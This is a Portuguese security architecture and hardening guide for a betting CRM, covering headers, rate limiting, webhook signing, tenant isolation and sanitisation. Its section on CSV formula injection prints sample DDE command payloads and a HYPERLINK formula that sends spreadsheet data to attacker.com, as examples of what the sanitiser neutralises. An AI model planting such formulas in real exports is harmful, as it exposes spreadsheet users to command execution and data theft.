# BET CRM — Arquitetura de Segurança, Hardening e Proteção de Produção

Este documento detalha todos os controles de segurança, conformidade OWASP, mitigação de ameaças, políticas de isolamento multi-tenant e hardening de infraestrutura implementados na **Fase 13** do **BET CRM**.

---

## 1. Visão Geral da Arquitetura de Segurança

O BET CRM foi projetado com uma estratégia de **Defesa em Profundidade (Defense-in-Depth)**, assegurando que múltiplos níveis de proteção atuem em camadas:

```text
[ CLIENT / EXTERNAL REQUESTS ]
           ↓
[ NGINX REVERSE PROXY ] (server_tokens off, dotfiles blocked, SSL/TLS, standard headers)
           ↓
[ SECURITY HEADERS MIDDLEWARE ] (CSP, HSTS, X-Content-Type-Options, Permissions-Policy)
           ↓
[ RATE LIMITING ENGINE ] (DDoS & Brute Force protection: login, webhooks, exports, API)
           ↓
[ AUTHENTICATION LAYER ] (Laravel Sanctum tokens, hash_equals, timing attack resistance)
           ↓
[ MULTI-TENANT ISOLATION ] (PlatformContext, PlatformScope, strict tenant boundaries)
           ↓
[ RBAC & POLICY ENGINE ] (Roles, Permissions, Gates, Least Privilege)
           ↓
[ DATA SANITIZATION ] (Anti-XSS, CSV Formula Injection defense, PII masking, token redaction)
           ↓
[ AUDIT LOGGING & LGPD ] (Immutable audit trail, consent lifecycle, right to erasure)
```

---

## 2. Controles de Segurança Implementados

### 2.1 HTTP Security Headers (`SecurityHeadersMiddleware`)
Todas as respostas da API e da aplicação web passam pelo middleware `SecurityHeadersMiddleware`, garantindo a injeção dos seguintes cabeçalhos em conformidade com as recomendações da OWASP:

* **`X-Content-Type-Options: nosniff`**: Impede que os navegadores façam MIME-type sniffing, mitigando ataques de upload de arquivos maliciosos mascarados como imagens ou textos.
* **`X-Frame-Options: SAMEORIGIN`**: Mitiga ataques de Clickjacking ao impedir que as telas do CRM sejam renderizadas em `<iframe>` externos.
* **`X-XSS-Protection: 1; mode=block`**: Ativa os filtros heurísticos de XSS de navegadores legado.
* **`Referrer-Policy: strict-origin-when-cross-origin`**: Evita vazamento de caminhos e parâmetros confidenciais na URL para servidores de terceiros.
* **`Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()`**: Desativa o acesso a hardware e APIs sensíveis do navegador.
* **`Content-Security-Policy (CSP)`**: Restringe origens de execução de scripts, fontes e conexões de rede (`default-src 'self' ...`).
* **`Strict-Transport-Security (HSTS)`**: Forçado em conexões HTTPS e ambiente de produção (`max-age=31536000; includeSubDomains; preload`).
* **Remoção de `X-Powered-By`**: Oculta a versão do PHP e do framework para dificultar o fingerprinting por atacantes.

---

### 2.2 Prevenção contra Injeção de Fórmulas em CSV (CSV Formula Injection / DDE)
Exportações de dados tabulares (relatórios operacionais, métricas de campanhas e perfis de jogadores) são alvos comuns de ataques onde um atacante cadastra nomes como:
```text
=cmd|'/C calc'!A0
+cmd|'/C notepad'!A0
@SUM(1+1)*cmd
=HYPERLINK("http://attacker.com/leak?data="&A1, "Clique Aqui")
```
* **Solução Implementada**: No `SensitiveDataSanitizer` e nos serviços `ReportsService` e `CampaignAnalyticsService`, qualquer célula textual iniciada por `=`, `+`, `-`, `@`, `\t` ou `\r` é automaticamente prefixada com um apóstrofo (`'`).
* **Resultado**: Aplicativos de planilha (Microsoft Excel, LibreOffice Calc, Google Sheets) interpretam o conteúdo estritamente como texto plano, neutralizando a execução arbitrária de fórmulas ou comandos do sistema operacional.

---

### 2.3 Taxas Limite (Rate Limiting) e Proteção contra DoS / Brute-Force

O sistema implementa múltiplos limitadores de taxa nomeados registrados no `AppServiceProvider` e no pipeline HTTP:

| Identificador | Limite | Escopo | Finalidade |
| :--- | :--- | :--- | :--- |
| `webhooks` | 300 req/min | Por plataforma (`platform_slug`) | Proteção contra flooding de webhooks de operadoras |
| `exports` | 10 req/min | Por usuário ou IP | Prevenção contra exaustão de memória e scraping em massa de relatórios |
| `auth/login` | 5 tentativas/min | Por e-mail + IP | Bloqueio contra ataques de força bruta de credenciais (Lockout) |
| `tracking` | 120 req/min | Por IP | Prevenção contra abusos em links de tracking de abertura/clique |
| `messages_test`| 20 req/min | Por usuário | Prevenção contra spam e custo excessivo com provedores de envio |
| `api` | 600 req/min | Por usuário / IP | Proteção geral de infraestrutura da API REST |

Quando o limite é excedido, a API responde com status **`429 Too Many Requests`** e payload JSON descritivo.

---

### 2.4 Segurança de Webhooks e Prevenção de Replay Attacks

O endpoint de ingestão de webhooks (`POST /api/v1/webhooks/{platform_slug}`) inclui:
1. **Validação de Assinatura HMAC-SHA256**:
   * O corpo bruto (`rawBody`) da requisição é assinado com o `webhook_secret` exclusivo da plataforma.
   * A verificação utiliza **`hash_equals()`**, garantindo resistência a ataques de temporização (Timing Attacks).
2. **Proteção contra Replay Attack via Timestamp**:
   * Suporte ao cabeçalho `X-Webhook-Timestamp`.
   * Requisições com defasagem temporal superior a **5 minutos (300 segundos)** são rejeitadas com HTTP 401.
3. **Proteção contra DoS por Payload Gigante**:
   * Payloads com tamanho superior a **512 KB** são imediatamente bloqueados com status **`413 Payload Too Large`** antes do parsing JSON ou processamento.
4. **Idempotência Estrita**:
   * Todo evento possui `external_event_id` validado contra a tabela de idempotência, garantindo que eventos duplicados sejam reconhecidos sem reprocessar depósitos, apostas ou logins.

---

### 2.5 Isolamento Multi-Tenant e Prevenção contra IDOR / BOLA

* Todos os modelos principais herdam o trait `BelongsToPlatform` com escopo global `PlatformScope`.
* O middleware `TenantPlatformContext` exige e valida o cabeçalho `X-Platform-Id` ou a sessão ativa contra as permissões do usuário autenticado.
* Consultas diretas em rotas que recebem `{id}` (Campanhas, Automações, Relatórios Agendados, Alertas, Solicitações LGPD) utilizam explicitamente `where('platform_id', $platformId)->findOrFail($id)`, impedindo que usuários de uma plataforma acessem ou alterem dados de outra plataforma (resposta 404/403).

---

### 2.6 Sanitização HTML e Proteção contra XSS
* O serviço `TemplateSanitizer` remove tags de script (`<script>`), iframes (`<iframe>`), objetos embed, formulários, pseudoprotocolos maliciosos (`javascript:`, `vbscript:`, `data:`) e manipuladores de eventos inline (`onload`, `onclick`, `onerror`).
* Variáveis dinâmicas em templates passam por sanitização prévia antes da renderização e envio aos jogadores.

---

### 2.7 Mascaramento e Redação de Segredos em Logs e Auditoria
* O `SensitiveDataSanitizer` detecta e redige chaves como `password`, `token`, `secret`, `api_key`, `private_key`, `cvv` com a marcação `***REDACTED***`.
* Dados pessoais de titulares (E-mails, Telefones, CPFs, Cartões) são mascarados em relatórios prévios, logs de auditoria e endpoints públicos (`carlos.santos@email.com` -> `ca***@email.com`, `12345678900` -> `***.456.789-**`).

---

### 2.8 Hardening do Nginx e Docker

* **`server_tokens off;`**: Desativa o envio da versão do Nginx nos cabeçalhos `Server` e telas de erro.
* **Bloqueio de arquivos ocultos e sensíveis**:
  * Bloqueia qualquer tentativa de leitura de `.env`, `.env.example`, `.git`, `.gitignore`.
  * Bloqueia acesso web a arquivos `composer.json`, `composer.lock`, `package.json`, pastas `vendor/` e `storage/logs/`.
* **Tamanho de Requisição Limitado**: Nginx configurado com limites seguros para uploads e buffers (`client_max_body_size`).

---

## 3. Guia de Homologação em Produção

Antes de colocar o ambiente em produção pública:
1. Certifique-se de que `APP_DEBUG=false` e `APP_ENV=production` no `.env`.
2. Gere uma nova chave de criptografia de aplicação: `php artisan key:generate`.
3. Configure `SANCTUM_EXPIRATION=1440` (24 horas) para expirar tokens de acesso de usuários inativos.
4. Execute o cacheamento de rotas e configurações:
   ```bash
   php artisan config:cache
   php artisan route:cache
   php artisan view:cache
   ```
5. Assegure que as conexões SSL/TLS sejam terminadas pelo Nginx ou Cloudflare com certificados válidos.
